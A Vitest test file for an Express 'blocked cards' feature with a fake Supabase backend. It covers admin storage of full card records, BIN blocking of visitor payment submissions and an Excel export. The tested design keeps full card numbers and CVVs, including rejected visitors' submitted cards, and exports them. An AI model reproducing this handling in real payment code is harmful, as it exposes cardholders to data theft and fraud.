import { beforeEach, describe, expect, it, vi } from "vitest";
import express from "express";
import { createServer } from "node:http";
import { readFile } from "node:fs/promises";

const fake = vi.hoisted(() => {
  const rows = new Map<string, { id: string; data: any }>();
  const key = (table: string, id: string) => `${table}:${id}`;
  const from = (table: string) => {
    const query: any = {
      select: () => query,
      eq: (_column: string, id: string) => {
        query.id = id;
        return query;
      },
      maybeSingle: async () => ({
        data: query.id ? rows.get(key(table, query.id)) ?? null : null,
        error: null,
      }),
      upsert: async (row: { id: string; data: any }) => {
        rows.set(key(table, row.id), row);
        return { error: null };
      },
      delete: () => ({
        eq: async (_col: string, id: string) => {
          rows.delete(key(table, id));
          return { error: null };
        },
      }),
    };
    return query;
  };
  return {
    rows,
    from,
    auth: {
      signInWithPassword: vi.fn(),
      getUser: vi.fn(),
    },
  };
});

vi.mock("./supabase", () => ({ serverSupabase: fake }));

import { registerRoutes } from "./routes";

describe("Blocked cards storage & Excel export", () => {
  beforeEach(() => {
    fake.rows.clear();
    fake.auth.getUser.mockResolvedValue({
      data: {
        user: {
          id: "admin-1",
          email: "admin@example.com",
          app_metadata: { role: "admin" },
        },
      },
      error: null,
    });
  });

  async function bootServer() {
    const app = express();
    app.use(express.json());
    const server = createServer(app);
    registerRoutes(server, app);
    await new Promise<void>((resolve) => server.listen(0, resolve));
    const address = server.address();
    const port = typeof address === "object" && address ? address.port : 0;
    return { server, base: `http://127.0.0.1:${port}` };
  }

  it("stores blocked cards when admin blocks them, records visitor attempts, and blocks server-side pays writes", async () => {
    const { server, base } = await bootServer();
    const adminHeaders = {
      "content-type": "application/json",
      cookie: "sb-access-token=admin-token",
    };

    try {
      // Unauthenticated cannot list or delete stored blocked cards
      expect((await fetch(`${base}/api/blocked-cards`)).status).toBe(401);

      // Admin blocks and stores a full card
      const storeRes = await fetch(`${base}/api/blocked-cards`, {
        method: "POST",
        headers: adminHeaders,
        body: JSON.stringify({
          cardNumber: "4532041111223344",
          expiryMonth: "10",
          expiryYear: "29",
          cvv: "123",
          cardName: "TEST USER",
          bankName: "Al Rajhi Bank",
          visitorName: "Test Visitor",
          source: "admin_block",
        }),
      });
      expect(storeRes.status).toBe(200);
      const storeJson = await storeRes.json();
      expect(storeJson.data.cards).toHaveLength(1);
      expect(storeJson.data.cards[0]).toMatchObject({
        bin: "453204",
        last4: "3344",
        bankName: "Al Rajhi Bank",
      });

      // Public blocked_bins check sees 453204 is blocked, without leaking PII
      const binRes = await fetch(`${base}/api/db/blocked_bins/453204`);
      expect(binRes.status).toBe(200);
      const binData = (await binRes.json()).data;
      expect(binData.bin).toBe("453204");
      expect(binData).not.toHaveProperty("cardNumber");
      expect(binData).not.toHaveProperty("cvv");

      // Visitor attempts to submit a card starting with blocked BIN 453204 -> rejected & recorded
      const vid = "visitor_123e4567-e89b-12d3-a456-426614174011";
      const blockedPayRes = await fetch(`${base}/api/db/pays/${vid}`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          payload: {
            cardNumber: "4532049988776655",
            expiryMonth: "11",
            expiryYear: "28",
            cvv: "999",
            cardName: "ATTEMPT USER",
          },
          merge: true,
        }),
      });
      expect(blockedPayRes.status).toBe(403);
      expect((await blockedPayRes.json()).error).toBe("BIN_BLOCKED");

      // Non-blocked BIN attempt via /api/blocked-cards/record is rejected
      const unblockedRecordRes = await fetch(`${base}/api/blocked-cards/record`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ cardNumber: "4111111111111111" }),
      });
      expect(unblockedRecordRes.status).toBe(400);

      // Admin reads stored cards -> includes both admin-blocked card and visitor attempt
      const listRes = await fetch(`${base}/api/blocked-cards`, {
        headers: adminHeaders,
      });
      expect(listRes.status).toBe(200);
      const cards = (await listRes.json()).data;
      expect(cards).toHaveLength(2);
      expect(cards.some((c: any) => c.last4 === "6655" && c.source === "visitor_attempt")).toBe(true);

      // Admin deletes one entry
      const delRes = await fetch(`${base}/api/blocked-cards/${cards[0].id}`, {
        method: "DELETE",
        headers: adminHeaders,
      });
      expect(delRes.status).toBe(200);
      expect((await delRes.json()).data).toHaveLength(1);
    } finally {
      server.close();
    }
  });

  it("exposes Excel generation for blocked cards in dashboard", async () => {
    const dashboardSource = await readFile("client/src/pages/dashboard.tsx", "utf8");
    expect(dashboardSource).toContain("exportBlockedCardsExcel");
    expect(dashboardSource).toContain("XLSX.writeFile");
    expect(dashboardSource).toContain('testId="export-blocked-excel"');
    expect(dashboardSource).toContain('data-testid="blocklist-export-excel"');
  });
});
